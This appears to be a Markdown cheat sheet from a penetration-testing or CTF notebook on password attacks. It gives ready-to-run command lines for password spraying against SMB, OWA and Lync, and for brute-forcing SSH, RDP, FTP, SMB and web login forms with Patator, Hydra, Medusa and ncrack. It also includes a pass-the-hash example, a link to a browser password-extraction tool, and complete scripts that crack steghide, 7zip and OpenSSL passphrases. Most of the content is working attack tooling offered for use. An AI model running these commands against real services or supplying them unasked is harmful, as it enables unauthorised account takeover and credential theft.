# Tools

## Word-lists

- CeWL - Custom Word List Generator: <https://github.com/digininja/CeWL>

## Password Spraying

### Spray
[Spray](https://github.com/SpiderLabs/Spray)
```
SMB:  spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 SPIDERLABS
OWA:  spray.sh -owa 192.168.0.1 users.txt passwords.txt 1 35 post-request.txt
Lync: spray.sh -lync https://lyncdiscover.spiderlabs.com/ users.txt passwords.txt 1 35

Note: For POST requests, replace username and password values with "sprayuser" and "spraypassword".
```
### Other
- Password spraying using AWS Lambda for IP rotation: <https://github.com/ustayready/CredKing>

## Brute-forcing

### Patator
[Patator - multi-purpose brute-forcer](https://github.com/lanjelot/patator)

```
FTP: patator ftp_login host=10.10.0.1 user=someUser password=FILE0 0=wordlist.txt
SSH: patator ssh_login host=10.10.0.1 user=someUser password=FILE0 0=wordlist.txt
```
```
* ftp_login      : Brute-force FTP
* ssh_login      : Brute-force SSH
* telnet_login   : Brute-force Telnet
* smtp_login     : Brute-force SMTP
* smtp_vrfy      : Enumerate valid users using the SMTP VRFY command
* smtp_rcpt      : Enumerate valid users using the SMTP RCPT TO command
* finger_lookup  : Enumerate valid users using Finger
* http_fuzz      : Brute-force HTTP/HTTPS
* rdp_gateway    : Brute-force RDP Gateway
* ajp_fuzz       : Brute-force AJP
* pop_login      : Brute-force POP
* pop_passd      : Brute-force poppassd (not POP3)
* imap_login     : Brute-force IMAP
* ldap_login     : Brute-force LDAP
* smb_login      : Brute-force SMB
* smb_lookupsid  : Brute-force SMB SID-lookup
* rlogin_login   : Brute-force rlogin
* vmauthd_login  : Brute-force VMware Authentication Daemon
* mssql_login    : Brute-force MSSQL
* oracle_login   : Brute-force Oracle
* mysql_login    : Brute-force MySQL
* mysql_query    : Brute-force MySQL queries
* rdp_login      : Brute-force RDP (NLA)
* pgsql_login    : Brute-force PostgreSQL
* vnc_login      : Brute-force VNC
* dns_forward    : Brute-force DNS
* dns_reverse    : Brute-force DNS (reverse lookup subnets)
* ike_enum       : Enumerate IKE transforms
* snmp_login     : Brute-force SNMPv1/2 and SNMPv3
* unzip_pass     : Brute-force the password of encrypted ZIP files
* keystore_pass  : Brute-force the password of Java keystore files
* sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
* umbraco_crack  : Crack Umbraco HMAC-SHA1 password hashes
```

```
patator http_fuzz url=http://example.com/index.php method=POST
body=​ 'name=zapper&password=FILE0&autologin=1&enter=Sign+in'
0=/usr/share/SecLists/Passwords/darkweb2017-top1000.txt accept_cookie=1 follow=1
-x ignore:fgrep=​ 'Login name or password is incorrect.'
```

#### Hydra - <https://github.com/vanhauser-thc/thc-hydra>

```
SSH: hydra 10.10.10.1 -l testuser -P wordlist.txt  -t 4 ssh
RDP: hydra -V -l testuser -P wordlist.txt rdp://10.10.10.1
FTP: hydra 10.10.10.1 -V -l testuser -P wordlist.txt ftp
SMB: hydra 10.10.10.1 -V -l testuser -P wordlist.txt smb
POST form: hydra -l testuser -p wordlist.txt -e nsr 10.10.10.1 http-post-form "http://10.10.10.1/login.php:username=^USER^&password=^PASS^&submit=Login:<Error message>" -V
```
```
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,
HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY,
HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy,
ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP,
Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP,
Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3,
SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet,
VMware-Auth, VNC and XMPP
```

#### Medusa - <https://github.com/jmk-foofus/medusa>
```
Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]


SSH: medusa -u testuser -P wordlist.txt -h <host> -M ssh
FTP: ncrack -u testuser -P wordlist.txt -T 5 <host> -M ftp
RDP (pass-the-hash): medusa -M rdp -m PASS:HASH -h <host> -u someuser -p <NTLM_hash>
```
```
AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3,
PostgreSQL, REXEC, RDP, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2,
Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC,
Generic Wrapper, Web Form
```

#### ncrack - <https://github.com/nmap/ncrack>
```
SSH: ncrack -u testuser -P wordlist.txt <host> -p 22
RDP: ncrack -u testuser -P wordlist.txt <host> -p 3389
FTP: ncrack -u testuser -P wordlist.txt <host> -p 21
```
```
SSH, RDP, FTP, Telnet, HTTP(S), Wordpress, POP3(S), IMAP, CVS, SMB, VNC, SIP,
Redis, PostgreSQL, MySQL, MSSQL, MongoDB, Cassandra, WinRM, OWA, DICOM.
```

#### [zip] fcrackzip - <https://github.com/hyc/fcrackzip>

```
fcrackzip -D -p wordlist.txt -u test.zip
```

## Generators

- Common password pattern generator using strings list: <https://github.com/localh0t/m4ngl3m3>
- A script for generating custom passphrase lists to be used for password cracking with hashcat rules: <https://github.com/dafthack/PassphraseGen>

## Extraction

- Firefox Decrypt - Tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles: <https://github.com/unode/firefox_decrypt>

## Bruteforce Steghide

```
#!/usr/bin/python3
# Author: https;//github.com/cOb4l7
# Description: A script to brute-force steghide passphrase.
# Dependecies: steghide

import argparse
import subprocess
import os

from threading import Thread


def steghideCracker(password, stegofile):
    """
    Brute-Force steghide passphrase
    This function brute-force steghide passphrase using a given file.
    Parameters
    ----------
        password: The passphrase
        stegofile: Selected stego file
    """
    steghide = ["steghide", "extract", "-sf", stegofile, "-p", password]

    FNULL = open(os.devnull, 'w')

    status = subprocess.run(args=steghide, stdout=FNULL,
                            stderr=subprocess.STDOUT)

    if status.returncode != 1:
        print("\033[32mSuccessfully brute-foce \033[35m{0}\033[32m passphrase:\
              \033[36m{1}\033[0m".format(stegofile, password))
        os._exit(0)


def main():
    parse = argparse.ArgumentParser(usage='%(prog)s [options]',
                                    description="A simple program to brute-\
                                    force steghide passhrase",
                                    epilog="Happy hacking ;)")
    parse.add_argument('-d', '--dictionary', help='Specify a dictionary file',
                       required=True, metavar='', dest='passfile',
                       type=argparse.FileType('r', encoding='latin-1'))
    parse.add_argument('-sf', '--stegofile', help='Specify a stego file',
                       required=True, metavar='', dest='stegofile')

    options = parse.parse_args()

    dict_file = options.passfile.read().splitlines()
    stegofile = options.stegofile

    for password in dict_file:
        t = Thread(target=steghideCracker, args=(password, stegofile))
        t.start()



if __name__ == "__main__":
    main()
```

## Bruteforce 7zip

```
#!/bin/bash
# Author: https://github.com/cOb4l7
# Description: Simple Script To Brute-Force 7z Archive passwords e.g HackTheBox
#              Lightweight Machine.

# Variables
STATUS=""
WORDLIST=""

help(){
echo "Usage: $0 <7z_file> <wordlist>"
exit 0
}

# If no arguments or just 1 show help message
if [[ $# -eq 0 ]] || [[ $# -eq 1 ]];then
        help
fi

if [[ $# -eq 2 ]];then
        # Check all the supplied user inputs to be correct
        if [[ "$1" = *.7z ]] && [[ -f $2 ]];then
                WORDLIST="$2"
                for password in $(cat "$WORDLIST")
                do
                        echo -en "\rTrying  $password"
                        7z x -p"$password" "$1" -aoa &> /dev/null
                        STATUS=$?

                        if [[ $STATUS -eq 0 ]];then
                                echo -e "\rArchive password is: \"$password\""
                                break
                        fi
                done

        fi
fi
```

## Bruteforce OpenSSL keys

> - <https://github.com/cOb4l7/scriptCTFs/tree/master/De-ICE>

```
#!/bin/bash
# Author:  https://github.com/cOb4l7
# Description: Simple script to brute-force openssl enc with a known password

KEY="tarot"
while IFS= read -r cipher;
do
        openssl enc -d -"$cipher" -in salary_dec2003.csv.enc -out salary_dec2003.csv -k "$KEY"
        if [[ $? -eq 0 ]];then
                echo -e "+\033[32m Successfully decrypted the file with cipher: \033[31m $cipher\033[0m"
                exit
        fi
done < ciphers.txt
```
